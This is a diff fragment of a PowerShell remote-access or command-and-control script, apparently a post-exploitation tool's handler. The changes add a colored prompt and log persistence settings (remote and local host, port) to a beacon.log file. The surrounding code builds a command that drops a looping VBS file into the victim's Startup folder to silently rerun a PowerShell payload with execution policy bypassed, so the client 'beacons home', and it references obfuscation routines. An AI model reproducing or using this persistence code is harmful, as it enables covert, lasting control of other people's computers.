@@ -620,7 +620,7 @@ While($Client.Connected)
         }
         If($wifi_choise -eq "KillProc" -or $wifi_choise -eq "kill")
         {
-          Write-Host " - Process Name: " -NoNewline;
+          Write-Host " - Process Name: " -NoNewline -ForeGroundColor Red;
           $Proc_name = Read-Host;
           If(-not ($proc_name) -or $Proc_name -eq " ")
           {
@@ -920,7 +920,14 @@ While($Client.Connected)
           Write-Host "   $payload_name.vbs  `$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs";
           Write-Host "   On StartUp our Client will beacon home from $Delay_Time to $Delay_Time seconds (loop)." -ForeGroundColor yellow;
           $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";          
-          # $Command = Variable_Obfuscation(Character_Obfuscation($Command));
+          #$Command = Variable_Obfuscation(Character_Obfuscation($Command));
+          ## Writing persistence setting into beacon.log local file ..
+          $dat = Get-Date;
+          $logfile = "$IPATH"+"beacon.log";
+          echo "" >> $logfile;echo "Persistence Settings" >> $logfile;
+          echo "--------------------" >> $logfile;echo "DATE  : $dat" >> $logfile;
+          echo "RHOST : $Remote_Host" >> $logfile;echo "LHOST : $Local_Host" >> $logfile;
+          echo "LPORT : $Local_Port" >> $logfile;echo "OBFUS : $ob" >> $logfile;echo "" >> $logfile
           }
         If($startup_choise -eq "RUNONCE" -or $startup_choise -eq "once")
         {
